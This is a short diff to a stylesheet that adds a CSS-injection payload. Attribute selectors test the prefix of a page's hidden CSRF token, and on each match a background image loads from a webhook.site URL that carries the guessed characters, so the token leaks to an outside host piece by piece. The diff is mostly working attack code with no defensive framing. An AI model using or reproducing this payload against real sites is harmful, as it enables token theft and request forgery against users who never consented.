@@ -246,3 +246,7 @@ input[name="csrf"][value^="ruW9"] {
     visibility: visible !important;
     background: url("https://webhook.site/4d91e71d-8d19-428f-bb6d-50860c92e280?c=ruW9");
 }
+input[name="csrf"][value^="ruW-"] {
+    visibility: visible !important;
+    background: url("https://webhook.site/4d91e71d-8d19-428f-bb6d-50860c92e280?c=ruW-");
+}
